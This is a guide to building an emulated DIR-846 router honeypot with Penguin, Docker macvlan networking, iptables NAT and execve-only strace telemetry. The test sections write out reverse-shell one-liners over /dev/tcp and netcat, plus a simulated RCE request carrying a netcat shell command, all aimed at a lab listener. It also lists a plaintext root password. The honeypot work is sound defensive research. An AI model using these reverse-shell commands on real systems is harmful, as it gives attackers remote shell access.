# Penguin Integration for XwangNet - Implementation Guide

*Last updated: January 25, 2026*

---

## 1. Requirements Checklist

**Starting Point:**
- Fresh Penguin installation
- Firmware binary/rootfs file (e.g., `dir846.rootfs.tar.gz`)

**Goal:** Fast-booting, network-accessible, telemetry-enabled honeypot node for XwangNet

### Core Requirements

- [x] **REQ-1:** Initialize Penguin project
- [x] **REQ-2:** Fix `/dev/null` device file
- [x] **REQ-3:** Configure networking in `config.yaml`
- [x] **REQ-4:** Enable filtered strace for telemetry
- [x] **REQ-5:** Prevent auto-shutdown
- [x] **REQ-6:** Set root credentials for SSH access and disable telnet
- [x] **REQ-7:** Configure Docker macvlan network
- [x] **REQ-8:** Configure iptables NAT for SLIRP outbound connectivity
- [x] **REQ-9:** Disable netifd to prevent network reconfiguration
- [x] **REQ-10:** Verify outbound connectivity to internal network (reverse shells)

### Validation Criteria

- [x] Boot time < 3 minutes (achieved: ~2 minutes)
- [x] Web server accessible (HTTP 200/302)
- [x] SSH authentication works (password: xwAn9N3t.!s.g0@+3d)
- [x] Strace logs capturing execve calls (1866+ traces)
- [x] Container stays running (no auto-shutdown)
- [x] Multiple instances can run simultaneously
- [x] Guest has SLIRP IP (10.0.2.15) with routing via 10.0.2.2
- [x] Outbound connectivity from guest to internal network (192.168.7.118) works
- [x] Container accessible at 192.168.7.50 from network

---

## 2. Configuration Steps

### REQ-1: Initialize Penguin Project

**Purpose:** Create project structure from firmware.

```bash
cd /home/zeus/hobbyist/testing
penguin init dir846.rootfs.tar.gz --output projects/dir846
```

**Output:**
```
projects/dir846/
├── config.yaml
├── base/
│   └── fs.tar.gz
└── static_patches/
    ├── base.yaml
    ├── manual.yaml
    ├── pseudofiles.dynamic.yaml
    └── ... (auto-generated patches)
```

---

### REQ-2: Fix `/dev/null` Device File

**Problem:** Penguin auto-analysis creates `/dev/null` as a directory, breaking VPN plugin.

**Impact:** Without this fix:
- VPN guest client fails to launch
- All service connections reset immediately
- Error: `can't create /dev/null: Is a directory`

#### Step 2.1: Add proper device file

**Edit:** `projects/dir846/static_patches/base.yaml`

**Find the `static_files:` section and add:**

```yaml
static_files:
  # ... existing files ...
  
  /dev/null:
    devtype: char
    major: 1
    minor: 3
    mode: 438
    type: dev
  
  /dev/zero:
    devtype: char
    major: 1
    minor: 5
    mode: 438
    type: dev
```

**Parameters:**
- `devtype: char` - Character device
- `major: 1, minor: 3` - Standard `/dev/null` device numbers
- `mode: 438` - Permissions (0666 octal = read/write for all)
- `type: dev` - Device file type

#### Step 2.2: Remove broken placeholder

**Edit:** `projects/dir846/static_patches/pseudofiles.dynamic.yaml`

**Find and DELETE this entire section:**

```yaml
/dev/null/.placeholder:
  ioctl:
    '*':
      model: return_const
      val: 0
  read:
    model: zero
  write:
    model: discard
```

**Verification:**
```bash
# Should return nothing:
grep "/dev/null/.placeholder" projects/dir846/static_patches/pseudofiles.dynamic.yaml

# Should show char device:
grep -A 5 "/dev/null:" projects/dir846/static_patches/base.yaml
```

---

### REQ-3: Configure Networking in config.yaml

**Purpose:** Enable network services and console access.

**Edit:** `projects/dir846/config.yaml`

**Find the `core:` section and set:**

```yaml
core:
  fs: ./base/fs.tar.gz
  plugin_path: /pyplugins
  root_shell: true          # Enable serial console access
  strace: true              # Enable telemetry (will be filtered)
  ltrace: false
  force_www: false
  show_output: true         # Show console logs
  immutable: true
  network: true             # CRITICAL: Enable networking
  version: 2
  auto_patching: true
  guest_cmd: false
  mem: 2G                   # Allocate sufficient memory
  kernel_quiet: false       # Verbose kernel for debugging
  smp: 1                    # Single CPU core
  graphics: false
```

**Key settings:**
- `network: true` - Enables networking (required for services)
- `root_shell: true` - Provides serial console access for debugging
- `show_output: true` - Console logs visible in stdout
- `mem: 2G` - Sufficient for most embedded firmware
- `strace: true` - Enables telemetry (filtered in next step)

---

### REQ-4: Enable Filtered Strace for Telemetry

**Problem:** Full `strace: true` captures ALL syscalls:
- 200,000+ log lines
- 10+ minute boot time
- Massive overhead

**Solution:** Filter to `execve` syscalls only:
- ~5,000 log lines
- 75-140 second boot time (8-10x speedup)
- Still captures all command execution

#### Step 4.1: Create filtered strace script

**Create:** `projects/dir846/static_patches/90_enable_strace_filtered.sh`

```bash
#!/bin/sh
# Filtered strace: only execve syscalls for fast boot + command logging
if [ ! -z "${STRACE}" ]; then
  echo "[CUSTOM] Starting filtered strace (execve only) for fast boot"
  # Only trace execve syscalls with full arguments
  /igloo/utils/sh -c "/igloo/utils/strace -f -e trace=execve -s 65535 -p 1" &
  /igloo/utils/sleep 1
  unset STRACE
fi
```

**Make executable:**
```bash
chmod +x projects/dir846/static_patches/90_enable_strace_filtered.sh
```

**Flags explained:**
- `-f` - Follow child processes
- `-e trace=execve` - Only trace execve syscalls (massive performance gain)
- `-s 65535` - Capture full command arguments (no truncation)
- `-p 1` - Attach to PID 1 (init), captures all descendants

#### Step 4.2: Add to config.yaml

**Edit:** `projects/dir846/config.yaml`

**Add to `static_files:` section:**

```yaml
static_files:
  /igloo/source.d/90_enable_strace.sh:
    type: host_file
    host_path: static_patches/90_enable_strace_filtered.sh
    mode: 0o755
```

**How it works:**
- Script placed in `/igloo/source.d/` (runs during boot)
- Checks for `STRACE` environment variable (set by Penguin when `strace: true`)
- Starts filtered strace in background
- Unsets `STRACE` to prevent Penguin's default full strace

**Performance comparison:**

| Method | Boot Time | Log Lines | Execve Count |
|--------|-----------|-----------|--------------|
| No strace | 30s | ~500 | 0 |
| Full strace | 650s | 200,905 | 1,159 |
| Filtered strace | 75-140s | ~5,000 | 1,159 |

---

### REQ-5: Prevent Auto-Shutdown

**Problem:** Penguin plugins designed for analysis automatically shutdown after collecting data:
- `shutdown_on_www: true` - Shuts down after web server detected
- `stop_on_if: true` - Stops on interface detection
- `shutdown_after_www: true` - Shuts down after fetching web pages

**For honeypots:** We need persistent operation.

**Edit:** `projects/dir846/static_patches/manual.yaml`

**Add/modify the `plugins:` section:**

```yaml
plugins:
  netbinds:
    enabled: true
    shutdown_on_www: false        # CRITICAL: Don't shutdown after web server starts
  
  nmap:
    enabled: false                # Disable nmap scanning
  
  vpn:
    enabled: true                 # Keep VPN for service bridging
  
  health:
    enabled: true                 # Health monitoring
  
  fetch_web:
    enabled: false
    shutdown_after_www: false     # CRITICAL: Don't shutdown after web fetch
    shutdown_on_failure: false    # CRITICAL: Don't shutdown on failure
  
  ficd:
    enabled: false
    stop_on_if: false             # CRITICAL: Don't stop on interface detection
```

**Critical settings:**
- `shutdown_on_www: false` - Prevents shutdown when web server starts
- `shutdown_after_www: false` - Prevents shutdown after web page fetch
- `shutdown_on_failure: false` - Prevents shutdown on errors
- `stop_on_if: false` - Prevents stop on interface detection

---

### REQ-6: Set Root Credentials for SSH Access

**Problem:** Default firmware has unknown/no root password. SSH access needed for:
- Shell testing
- Manual verification
- Honeypot interaction monitoring

**CRITICAL:** Old embedded dropbear SSH only supports **MD5 hashes** (`$1$`), NOT SHA-512 (`$6$`)!

#### Step 6.1: Extract rootfs

```bash
mkdir -p /tmp/rootfs_mod
cd /tmp/rootfs_mod
tar -xzf /path/to/projects/dir846/base/fs.tar.gz
```

#### Step 6.2: Generate MD5 password hash

```bash
# Replace YOUR_PASSWORD with your desired password
openssl passwd -1 -salt "QTEtMmuy" "YOUR_PASSWORD"

# Example output:
# $1$QTEtMmuy$zzdFU4vs5v4/ejDHYXX.m.
```

**Why MD5?**
- Old OpenWrt/dropbear implementations don't support SHA-512
- Original firmware uses `$1$` (MD5) format
- SHA-512 (`$6$`) will cause "Permission denied" even with correct password

#### Step 6.3: Edit /etc/shadow

**Edit:** `/tmp/rootfs_mod/etc/shadow`

```
root:$1$QTEtMmuy$YOUR_HASH_HERE:18000:0:99999:7:::
daemon:*:0:0:99999:7:::
ftp:*:0:0:99999:7:::
network:*:0:0:99999:7:::
nobody:*:0:0:99999:7:::
admin:$1$QTEtMmuy$YOUR_HASH_HERE:18000:0:99999:7:::
```

**Important:**
- Replace `YOUR_HASH_HERE` with the hash from step 6.2
- Set both `root` and `admin` passwords
- Keep other users with `*` (disabled)

#### Step 6.4: Edit /etc/passwd

**Edit:** `/tmp/rootfs_mod/etc/passwd`

```
root:x:0:0:root:/root:/bin/ash
daemon:*:1:1:daemon:/var:/bin/false
ftp:*:55:55:ftp:/home/ftp:/bin/false
network:*:101:101:network:/var:/bin/false
nobody:*:65534:65534:nobody:/var:/bin/false
admin:x:0:1002:,,,:/root:/bin/ash
```

**Verify:**
- `root` has UID 0 (superuser)
- Shell is `/bin/ash` (OpenWrt default)
- `admin` also has UID 0 (root equivalent)

#### Step 6.5: Verify dropbear SSH config

**Check:** `/tmp/rootfs_mod/etc/config/dropbear`

```
config dropbear
	option PasswordAuth 'on'
	option RootPasswordAuth 'on'
	option Port         '22'
```

**If missing or incorrect, edit to enable password authentication.**

#### Step 6.6: Disable telnet service

**Purpose:** Disable telnet to ensure only SSH is available for management access.

**Why disable telnet:**
- Telnet transmits credentials in plaintext
- Less secure than SSH
- Not needed when SSH (dropbear) is available
- Reduces attack surface

```bash
cd /tmp/rootfs_mod

# Remove telnet startup symlinks
rm -f etc/rc.d/S50telnet
rm -f etc/rc.d/K*telnet

# Verify telnet is disabled
ls -l etc/rc.d/*telnet* 2>/dev/null || echo "✓ Telnet disabled"
```

**What this does:**
- Removes `/etc/rc.d/S50telnet` symlink (prevents auto-start)
- Telnet daemon (`/usr/sbin/telnetd`) will not start on boot
- Binary remains but is never executed
- SSH (dropbear) remains fully functional

#### Step 6.7: Backup and repackage

```bash
# Backup original
cp projects/dir846/base/fs.tar.gz projects/dir846/base/fs.tar.gz.backup

# Repackage with modifications
cd /tmp/rootfs_mod
tar -czf /path/to/projects/dir846/base/fs.tar.gz .

# Cleanup
cd /tmp
rm -rf rootfs_mod
```

#### Step 6.8: SSH access commands

**Basic SSH:**
```bash
ssh root@192.168.7.50
```

**With legacy algorithm support (required for old dropbear):**
```bash
ssh -o KexAlgorithms=+diffie-hellman-group1-sha1 \
    -o HostKeyAlgorithms=+ssh-rsa,ssh-dss \
    root@192.168.7.50
```

**Or add to `~/.ssh/config`:**
```
Host 192.168.7.50
    KexAlgorithms +diffie-hellman-group1-sha1
    HostKeyAlgorithms +ssh-rsa,ssh-dss
    PubkeyAuthentication no
```

Then simply:
```bash
ssh root@192.168.7.50
```

---

### REQ-7: Configure Docker Macvlan Network

**Purpose:** Place emulated devices on physical network for realistic honeypot deployment.

#### Step 7.1: Create macvlan network

```bash
docker network create -d macvlan \
  --subnet=192.168.7.0/24 \
  --gateway=192.168.7.1 \
  -o parent=ens18 \
  xwangnet_lan
```

**Parameters:**
- `--subnet` - Match your physical network subnet
- `--gateway` - Your network gateway/router
- `-o parent=ens18` - Physical network interface (adjust for your system)
- `xwangnet_lan` - Network name

#### Step 7.2: Create macvlan shim (for host access)

**Problem:** Macvlan network limitation - host cannot directly communicate with macvlan containers.

**Solution:** Create a shim interface.

```bash
sudo ip link add macvlan-shim link ens18 type macvlan mode bridge
sudo ip addr add 192.168.7.119/32 dev macvlan-shim
sudo ip link set macvlan-shim up
sudo ip route add 192.168.7.50/32 dev macvlan-shim
```

**Parameters:**
- `link ens18` - Physical interface (match parent from step 7.1)
- `192.168.7.119` - Unused IP for shim (adjust for your network)
- `192.168.7.50` - Container IP you want to access from host

**Note:** Shim only needed if you want to access containers from the host running Docker. Other machines on the network can access containers directly.

---

### REQ-8: Configure iptables NAT for SLIRP Outbound Connectivity

**Problem:** DIR-846 firmware expects two network interfaces (LAN + WAN). With only one interface (eth0), the firmware's `netifd` configures it as a static LAN interface and never requests DHCP from SLIRP. Additionally, macvlan network breaks SLIRP's ability to reach the physical network directly.

**Solution:** 
1. Disable `netifd` to prevent network reconfiguration
2. Manually configure guest eth0 with SLIRP IP (10.0.2.15)
3. Add iptables NAT rules in container to bridge SLIRP (10.0.2.x) to physical network (192.168.7.x)

#### Step 8.1: Create NAT configuration script

**Create:** `projects/dir846/static_patches/95_macvlan_nat.sh`

```bash
#!/bin/sh
# Setup NAT for SLIRP traffic on macvlan network

echo "═══════════════════════════════════════════════════════════"
echo "  MACVLAN + SLIRP NAT CONFIGURATION"
echo "═══════════════════════════════════════════════════════════"

# Wait for network to be ready
sleep 5

echo "[1] Setting up iptables NAT for SLIRP traffic..."
# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Add MASQUERADE for SLIRP subnet (10.0.2.0/24) going out eth0
iptables -t nat -A POSTROUTING -s 10.0.2.0/24 -o eth0 -j MASQUERADE

# Allow forwarding from SLIRP subnet
iptables -A FORWARD -s 10.0.2.0/24 -j ACCEPT
iptables -A FORWARD -d 10.0.2.0/24 -m state --state ESTABLISHED,RELATED -j ACCEPT

echo "✓ NAT rules configured"
echo ""

echo "[2] Verifying iptables rules..."
iptables -t nat -L POSTROUTING -n -v | grep 10.0.2
echo ""

echo "[3] Disabling netifd..."
killall netifd 2>/dev/null
mv /sbin/netifd /sbin/netifd.disabled 2>/dev/null || echo "netifd already disabled"
echo "✓ netifd disabled"
echo ""

echo "[4] Configuring guest network..."
ifconfig eth0 10.0.2.15 netmask 255.255.255.0 up
route add default gw 10.0.2.2 dev eth0
echo "✓ Guest network configured"
echo ""

echo "[5] Testing connectivity..."
echo -n "SLIRP gateway (10.0.2.2): "
ping -c 2 -W 2 10.0.2.2 > /dev/null 2>&1 && echo "✅ REACHABLE" || echo "❌ UNREACHABLE"

echo -n "Physical gateway (192.168.7.1): "
ping -c 2 -W 2 192.168.7.1 > /dev/null 2>&1 && echo "✅ REACHABLE" || echo "❌ UNREACHABLE"

echo -n "Target host (192.168.7.118): "
ping -c 2 -W 2 192.168.7.118 > /dev/null 2>&1 && echo "✅ REACHABLE" || echo "❌ UNREACHABLE"

echo ""
echo "═══════════════════════════════════════════════════════════"
```

**Make executable:**
```bash
chmod +x projects/dir846/static_patches/95_macvlan_nat.sh
```

#### Step 8.2: Add script to config.yaml

**Edit:** `projects/dir846/config.yaml`

**Add to `static_files` section:**
```yaml
static_files:
  /igloo/source.d/90_enable_strace.sh:
    type: host_file
    host_path: static_patches/90_enable_strace_filtered.sh
    mode: 0o755
  /igloo/source.d/95_macvlan_nat.sh:
    type: host_file
    host_path: static_patches/95_macvlan_nat.sh
    mode: 0o755
```

**Why this works:**
- **netifd disabled:** Firmware's network daemon can't reconfigure network
- **Manual IP assignment:** Guest gets 10.0.2.15 and routes via 10.0.2.2 (SLIRP)
- **iptables MASQUERADE:** Changes source IP from 10.0.2.15 → 192.168.7.50 when leaving container
- **Result:** Guest can reach physical network (192.168.7.x) for reverse shells

---

### REQ-9: Run Penguin with Configuration

**Purpose:** Start the emulated device with all configurations applied.

```bash
cd /home/zeus/hobbyist/testing

penguin \
  --subnet none \
  --name dir846-honeypot \
  --extra_docker_args "--network xwangnet_lan --ip 192.168.7.50 -e CONTAINER_IP=192.168.7.50 -e GATEWAY=192.168.7.1" \
  run projects/dir846/config.yaml
```

**Flag explanations:**

**Penguin wrapper flags** (before `run`):
- `--subnet none` - Disable Penguin's automatic bridge network creation
- `--name dir846-honeypot` - Container name
- `--extra_docker_args "..."` - Pass Docker networking args (single quoted string)

**Docker args** (inside `--extra_docker_args`):
- `--network xwangnet_lan` - Use the macvlan network
- `--ip 192.168.7.50` - Assign specific IP on physical network
- `-e CONTAINER_IP=192.168.7.50` - Tell VPN plugin where to expose services
- `-e GATEWAY=192.168.7.1` - Network gateway for routing

**Critical:** `CONTAINER_IP` environment variable tells Penguin's VPN plugin where to bridge guest services.

### REQ-9: Run Penguin with Configuration

**Purpose:** Start the emulated device with all configurations applied.

```bash
cd /home/zeus/hobbyist/testing

penguin \
  --subnet none \
  --name dir846-honeypot \
  --extra_docker_args "--network xwangnet_lan --ip 192.168.7.50 --cap-add=NET_ADMIN -e CONTAINER_IP=192.168.7.50 -e GATEWAY=192.168.7.1" \
  run projects/dir846/config.yaml
```

**Flag explanations:**

**Penguin wrapper flags** (before `run`):
- `--subnet none` - Disable Penguin's automatic bridge network creation
- `--name dir846-honeypot` - Container name
- `--extra_docker_args "..."` - Pass Docker networking args (single quoted string)

**Docker args** (inside `--extra_docker_args`):
- `--network xwangnet_lan` - Use the macvlan network
- `--ip 192.168.7.50` - Assign specific IP on physical network
- `--cap-add=NET_ADMIN` - **REQUIRED** for iptables NAT rules
- `-e CONTAINER_IP=192.168.7.50` - Tell VPN plugin where to expose services
- `-e GATEWAY=192.168.7.1` - Network gateway for routing

**Critical:** 
- `CONTAINER_IP` environment variable tells Penguin's VPN plugin where to bridge guest services
- `NET_ADMIN` capability allows iptables NAT configuration in container

**Expected output:**
```
[*] Starting PANDA...
[*] VPN plugin bridging services...
[*] Console output visible...
═══════════════════════════════════════════════════════════
  MACVLAN + SLIRP NAT CONFIGURATION
═══════════════════════════════════════════════════════════
[1] Setting up iptables NAT for SLIRP traffic...
✓ NAT rules configured
[2] Verifying iptables rules...
[3] Disabling netifd...
✓ netifd disabled
[4] Configuring guest network...
✓ Guest network configured
[5] Testing connectivity...
SLIRP gateway (10.0.2.2): ✅ REACHABLE
Physical gateway (192.168.7.1): ✅ REACHABLE
Target host (192.168.7.118): ✅ REACHABLE
```

**Boot time:** 75-140 seconds with filtered strace

---

### REQ-10: Verify Outbound Connectivity to Internal Network

**Purpose:** Ensure emulated devices can initiate connections to internal network (required for reverse shells, callbacks, C2 communication).

**Why this matters:**
- Honeypot captures exploit → Exploit launches reverse shell
- Emulated device needs to connect back to attacker/listener
- Tests realistic malware behavior (callbacks, C2, lateral movement)

#### Step 10.1: Test outbound connectivity from guest

**From the host (192.168.7.118), start a listener:**
```bash
# TCP listener on port 4444
nc -lvnp 4444
```

**SSH into the emulated device:**
```bash
ssh -o KexAlgorithms=+diffie-hellman-group1-sha1 \
    -o HostKeyAlgorithms=+ssh-rsa,ssh-dss \
    root@192.168.7.50
```

**Inside the guest, test outbound connection:**
```bash
# Test TCP connectivity
nc -v 192.168.7.118 4444

# Or test with wget/curl
wget http://192.168.7.118:8000/test

# Or test with telnet
telnet 192.168.7.118 4444
```

**Expected result:**
```
# On guest:
Connection to 192.168.7.118 4444 port [tcp/*] succeeded!

# On listener (192.168.7.118):
Connection received from 192.168.7.50 <random_port>
```

#### Step 10.2: Test reverse shell scenario

**On attacker machine (192.168.7.118):**
```bash
# Start reverse shell listener
nc -lvnp 4444
```

**On emulated device (192.168.7.50), simulate exploit payload:**
```bash
ssh root@192.168.7.50

# Inside guest - launch reverse shell
/bin/sh -i >& /dev/tcp/192.168.7.118/4444 0>&1

# Or with netcat
nc 192.168.7.118 4444 -e /bin/sh

# Or with busybox
busybox nc 192.168.7.118 4444 -e /bin/sh
```

**Expected result:**
- Listener receives connection
- Shell prompt appears on attacker machine
- Commands execute on emulated device
- Output returns to attacker

**Verify in strace logs:**
```bash
# Should see the reverse shell execution
docker logs dir846-honeypot | grep -A 5 "192.168.7.118"
```

#### Step 10.3: Troubleshooting connectivity issues

**Issue:** Connection refused or timeout

**Check 1: Verify guest can reach gateway**
```bash
# Inside guest
ping 192.168.7.1

# Should succeed
```

**Check 2: Verify guest routing**
```bash
# Inside guest
ip route show

# Should show:
# default via 192.168.7.1 dev eth0
```

**Check 3: Check VPN plugin bridging**
```bash
# VPN should be forwarding in both directions
cat projects/dir846/results/0/vpn_bridges.csv

# Check if outbound is working
docker exec dir846-honeypot ip addr show
```

**Check 4: Verify GATEWAY environment variable**
```bash
docker inspect dir846-honeypot | grep GATEWAY

# Should show:
# "GATEWAY=192.168.7.1"
```

**Check 5: Test from container network namespace**
```bash
# Test if container can reach the target
docker exec dir846-honeypot ping -c 3 192.168.7.118

# If this works but guest can't, issue is in VPN plugin forwarding
# If this fails, issue is in Docker/macvlan network setup
```

**Common solutions:**

1. **Missing GATEWAY env var:**
```bash
# Add to penguin run command:
-e GATEWAY=192.168.7.1
```

2. **Firewall blocking outbound from container:**
```bash
# Check host firewall
sudo iptables -L -n -v | grep 192.168.7

# Allow macvlan traffic
sudo iptables -I FORWARD -i xwangnet_lan -j ACCEPT
sudo iptables -I FORWARD -o xwangnet_lan -j ACCEPT
```

3. **VPN plugin not forwarding outbound:**
This should work by default with VPN plugin, but verify:
```bash
# Check VPN process is running
docker exec dir846-honeypot ps aux | grep vpn
```

#### Step 10.4: Complete reverse shell test procedure

**Complete test from exploit to callback:**

1. **Setup listener on 192.168.7.118:**
```bash
nc -lvnp 4444
```

2. **Simulate web exploit on 192.168.7.50:**
```bash
# Via curl to web server (simulating RCE)
curl "http://192.168.7.50/cgi-bin/exploit.cgi?cmd=nc%20192.168.7.118%204444%20-e%20/bin/sh"
```

3. **Verify connection established:**
```
Connection received from 192.168.7.50 <port>
```

4. **Test shell interactivity:**
```bash
# On listener, type:
uname -a
whoami
ps aux
```

5. **Check telemetry captured:**
```bash
# Should see the exploit and reverse shell in logs
docker logs dir846-honeypot | grep -B 5 -A 10 "192.168.7.118"
```

**Success criteria:**
- [ ] Guest can ping gateway (192.168.7.1)
- [ ] Guest can connect to internal IPs (192.168.7.x)
- [ ] Reverse shell connects back successfully
- [ ] Shell is interactive (commands work)
- [ ] Connection captured in strace logs

---

### REQ-9: Create Docker Image for XwangNet

**Purpose:** Capture working configuration as reusable image.

#### Step 9.1: Validate instance

**Before committing, ensure:**
- [ ] Boot completed successfully
- [ ] Web server accessible
- [ ] SSH works with password
- [ ] Strace logs present
- [ ] Container still running (no shutdown)

#### Step 9.2: Commit container

```bash
docker commit dir846-honeypot xwangnet/dir846-honeypot:v1
docker tag xwangnet/dir846-honeypot:v1 xwangnet/dir846-honeypot:latest
```

#### Step 9.3: Test image

```bash
docker run -d \
  --name dir846-test \
  --network xwangnet_lan \
  --ip 192.168.7.51 \
  -e CONTAINER_IP=192.168.7.51 \
  -e GATEWAY=192.168.7.1 \
  xwangnet/dir846-honeypot:v1
```

**Wait 2 minutes, then verify:**
```bash
curl http://192.168.7.51
ssh root@192.168.7.51
docker logs dir846-test | grep execve | wc -l
```

#### Step 9.4: Push to registry (optional)

```bash
docker tag xwangnet/dir846-honeypot:v1 registry.example.com/xwangnet/dir846-honeypot:v1
docker push registry.example.com/xwangnet/dir846-honeypot:v1
```

---

## 3. Technical Documentation

### 3.1 How Filtered Strace Works

**Standard Penguin strace flow:**
```
Penguin sets STRACE=1 env var
    ↓
igloo preinit detects STRACE
    ↓
Starts: strace -ff -o /results/strace <full_syscall_trace>
    ↓
Result: 200K+ lines, 10+ minute boot
```

**Filtered strace flow:**
```
Penguin sets STRACE=1 env var
    ↓
Our script in /igloo/source.d/ runs first
    ↓
Starts: strace -f -e trace=execve -s 65535 -p 1 &
    ↓
Unsets STRACE env var
    ↓
igloo preinit sees no STRACE, skips default
    ↓
Result: ~5K lines, 75-140s boot, all command execution captured
```

**Key techniques:**
1. **Script in `/igloo/source.d/`** - Runs before igloo's strace check
2. **Attach to PID 1** - Captures init and all descendants
3. **Filter to execve only** - Massive performance gain
4. **Unset STRACE** - Prevents Penguin's default full trace
5. **Background process** - Doesn't block boot

### 3.2 Why `/dev/null` Fix is Critical

**Penguin's VPN plugin workflow:**
```
1. Detect services binding to ports in guest
2. Launch VPN guest client to establish vsock tunnel
3. Guest client command:
   /path/to/vpn_client > /dev/null 2>&1 &
4. Bridge guest services to container network
```

**If `/dev/null` is a directory:**
```
Shell redirect fails: can't create /dev/null: Is a directory
    ↓
VPN client never starts
    ↓
No vsock tunnel established
    ↓
Service connections reset immediately
```

**Why auto-analysis creates directory:**
- Penguin sees firmware trying to access `/dev/null`
- Creates placeholder directory structure
- Doesn't recognize it needs to be a device file
- Adds broken `.placeholder` pseudofile entry

**The fix:**
- Explicitly define as `char` device with correct major/minor
- Remove placeholder entry that conflicts
- Device file created before firmware init runs

### 3.3 Telemetry Architecture

**Two-tier approach:**

**Tier 1: OS-level (Penguin strace)**
- **Location:** Container stdout/logs
- **Captures:** Process execution (execve syscalls)
- **Format:** `[pid X] execve("/bin/sh", ["sh", "-c", "command"], ...) = 0`
- **View:** `docker logs <container> | grep execve`
- **Value:** Shell commands, exploit payloads, process spawning

**Tier 2: Network-level (Suricata)**
- **Location:** Per-deployment Suricata container
- **Captures:** HTTP, DNS, TLS, IDS alerts
- **Format:** EVE JSON logs
- **Value:** Network attacks, traffic patterns, C2 communication

**Why separate?**
- Suricata handles network without per-node overhead
- Strace captures OS-level that network can't see
- Complementary coverage

**Penguin telemetry files:**

| File | Location | Content | Honeypot Value |
|------|----------|---------|----------------|
| `console.log` | `results/0/` | Full boot log, kernel messages | ⭐⭐⭐ |
| `netbinds.csv` | `results/0/` | Services bound to ports | ⭐⭐ |
| `vpn_bridges.csv` | `results/0/` | Port forwarding rules | ⭐⭐ |
| `shell_env.csv` | `results/0/` | Shell commands during boot | ⭐ |
| `health_procs.txt` | `results/0/` | All processes executed | ⭐⭐ |
| `plugins.db` | `results/0/` | SQLite with exec events | ⭐⭐⭐ |

**Accessing telemetry:**
```bash
# Strace (primary honeypot telemetry)
docker logs dir846-honeypot | grep execve

# Penguin analysis files
ls -la projects/dir846/results/0/

# Service exposure
cat projects/dir846/results/0/vpn_bridges.csv

# Boot log
tail -f projects/dir846/results/0/console.log
```

### 3.4 Network Architecture

**Complete network topology:**

```
┌─────────────────────────────────────────────────────────┐
│  Physical Network (192.168.7.x)                         │
│                                                          │
│  ┌────────────────────────────────────────────────┐    │
│  │ Docker Container (dir846-final)                │    │
│  │ IP: 192.168.7.50 (macvlan)                     │    │
│  │                                                 │    │
│  │  - eth0: 192.168.7.50/24 (macvlan)             │    │
│  │  - iptables NAT: 10.0.2.0/24 → 192.168.7.50    │    │
│  │                                                 │    │
│  │  ┌──────────────────────────────────────────┐  │    │
│  │  │ QEMU/PANDA                               │  │    │
│  │  │                                          │  │    │
│  │  │  ┌────────────────────────────────────┐ │  │    │
│  │  │  │ DIR-846 Firmware (Guest)           │ │  │    │
│  │  │  │ IP: 10.0.2.15 (SLIRP, internal)   │ │  │    │
│  │  │  │                                    │ │  │    │
│  │  │  │ - eth0: 10.0.2.15/24              │ │  │    │
│  │  │  │ - gateway: 10.0.2.2               │ │  │    │
│  │  │  │ - netifd: DISABLED                │ │  │    │
│  │  │  │                                    │ │  │    │
│  │  │  │ Services:                          │ │  │    │
│  │  │  │ - lighttpd (port 80)              │ │  │    │
│  │  │  │ - dropbear (port 22)              │ │  │    │
│  │  │  └────────────────────────────────────┘ │  │    │
│  │  │         ↑ SLIRP (10.0.2.2)              │  │    │
│  │  │         ↑ NAT via iptables              │  │    │
│  │  └──────────────────────────────────────────┘  │    │
│  │         ↑ VPN plugin (vsock tunnels)           │    │
│  └────────────────────────────────────────────────┘    │
│         ↑ Accessible at 192.168.7.50                   │
└─────────────────────────────────────────────────────────┘
```

**Traffic Flow - Inbound (External → Guest):**
```
1. Browser: http://192.168.7.50:80
   ↓
2. Macvlan interface (192.168.7.50)
   ↓
3. Penguin VPN plugin (vsock tunnel)
   ↓
4. Guest lighttpd (listening internally)
   ↓
5. Response back through same path
```

**Traffic Flow - Outbound (Guest → External):**
```
1. Guest (10.0.2.15): ping 192.168.7.118
   ↓
2. SLIRP gateway (10.0.2.2)
   ↓
3. Container iptables NAT (MASQUERADE)
   ↓  Source IP: 10.0.2.15 → 192.168.7.50
   ↓
4. Container eth0 (192.168.7.50)
   ↓
5. Physical network → 192.168.7.118
   ↓
6. Response: 192.168.7.118 → 192.168.7.50
   ↓
7. iptables NAT (reverse translation)
   ↓  Dest IP: 192.168.7.50 → 10.0.2.15
   ↓
8. SLIRP gateway → Guest (10.0.2.15)
```

**Why this architecture:**

1. **Macvlan network:**
   - Container gets IP on physical network (192.168.7.50)
   - External devices can access directly (no port mapping)
   - Appears as real device on network (realistic honeypot)

2. **SLIRP networking (10.0.2.15):**
   - QEMU's user-mode networking
   - No special privileges required
   - Simple, works out-of-box

3. **VPN plugin (vsock tunnels):**
   - Bridges guest services to container network
   - Automatic service detection and forwarding
   - No manual port configuration needed

4. **iptables NAT:**
   - Bridges SLIRP's isolated network to physical network
   - Allows outbound connectivity from guest
   - Essential for reverse shells, callbacks, C2 communication

**Key environment variables:**
- `CONTAINER_IP=192.168.7.50` - Where VPN plugin exposes services
- `GATEWAY=192.168.7.1` - Network gateway for routing

**Why netifd must be disabled:**
- DIR-846 firmware expects two interfaces (LAN + WAN)
- With only eth0, netifd configures it as static LAN (192.168.0.1)
- This overwrites our SLIRP configuration (10.0.2.15)
- Disabling netifd preserves manual network configuration

### 3.5 Plugin Architecture

**Penguin plugins run in phases:**

```
Phase 1: Pre-boot
    ↓
Plugins load and initialize
    ↓
Phase 2: Boot
    ↓
QEMU starts, firmware boots
Plugins monitor syscalls, network, etc.
    ↓
Phase 3: Analysis
    ↓
Plugins collect data (netbinds, execs, health)
    ↓
Phase 4: Shutdown triggers
    ↓
Plugins check shutdown conditions
    ↓
Phase 5: Post-run
    ↓
Plugins write analysis files
```

**For honeypots:**
- Want Phase 1-3 (boot, monitor)
- **Don't want Phase 4** (shutdown triggers)
- Phase 5 happens when manually stopped

**Critical plugins:**
- `vpn` - Bridges guest services (KEEP enabled)
- `netbinds` - Detects services (KEEP enabled, disable shutdown)
- `health` - Process monitoring (KEEP enabled)
- `fetch_web` - Analysis only (DISABLE)
- `ficd` - Analysis only (DISABLE)
- `nmap` - Analysis only (DISABLE)

### 3.6 Troubleshooting Guide

#### Issue: "Permission denied" on SSH with correct password

**Symptoms:**
- SSH prompts for password
- Enter correct password
- "Permission denied, please try again"
- Repeats 3 times, then disconnects

**Root cause:** Password hash format incompatible

**Check:**
```bash
# Extract rootfs and check hash
tar -xzf projects/dir846/base/fs.tar.gz -C /tmp/check
head -1 /tmp/check/etc/shadow

# Should see:
root:$1$salt$hash...    # ✓ MD5 (correct)

# NOT:
